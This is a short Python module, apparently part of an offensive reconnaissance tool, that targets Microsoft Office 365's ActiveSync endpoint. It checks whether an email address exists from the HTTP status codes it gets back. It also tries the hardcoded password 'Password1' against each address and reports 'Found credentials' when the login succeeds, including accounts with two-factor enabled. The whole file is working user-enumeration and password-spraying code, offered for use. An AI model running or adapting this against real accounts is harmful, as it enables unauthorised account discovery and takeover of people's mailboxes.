from lib import logger
import requests

def validate(email):
	try:
		password='Password1'
		url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'
		headers = {"MS-ASProtocolVersion": "14.0"}
		auth = (email, password)

		try:
			r = requests.options(url, headers=headers, auth=auth)
			status = r.status_code
		except:
			logger.red('Unable to connect to [%s]' % logger.RED(url))
			quit()

		if status == 401:
			logger.green('Successfully validated %s' % logger.GREEN(email))
			return True

		elif status == 404:
			if r.headers.get("X-CasErrorCode") == "emailNotFound":
				logger.red('Could not validate %s' % logger.RED(email))
				return False

		elif status == 403:
			logger.green('Found credentials: %s:%s (2FA)' % (logger.GREEN(email),logger.GREEN(password)))
			return [True,password]

		elif status == 200:
			logger.green('Found credentials: %s:%s' % (logger.GREEN(email),logger.GREEN(password)))
			return [True,password]
		else:
			logger.red('Got HTTP Status Response %s. Unexected, skipping.')
			return None

	except KeyboardInterrupt:
		logger.yellow('Keyboard interrupt detected!')
		quit()
